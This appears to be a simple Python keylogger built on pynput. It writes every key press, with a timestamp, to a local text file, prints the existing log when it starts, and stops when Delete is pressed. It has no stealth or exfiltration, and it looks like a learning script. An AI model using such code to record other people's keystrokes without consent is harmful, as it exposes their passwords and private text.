import pynput
from pynput.keyboard import Key, Listener
import logging

#Reports on any texts that already exists within the file upon running program
try:
   x = open("keyboardOutput.txt", "r")
except:
    print("There is no text within this file.")
else:
    print(x.read())

        
#Specify the location of the text file
#Formatting date to MM/DD/YY
logging.basicConfig(filename = ("keyboardOutput.txt"), 
    level = logging.DEBUG, 
    format='%(asctime)s: %(message)s',
    datefmt='%m-%d-%Y %H:%M:%S',)

#Calling the on_press function and using keysPress as a parameter
#The Delete key will end the program
def on_press(keysPress):
    try:
      logging.info(str(keysPress))
    except:
        print("An error occured")
        
def keyRelease(key):
    if key == Key.delete:
        return False

with Listener(on_press=on_press, on_release = keyRelease) as listen:
    listen.join()
  


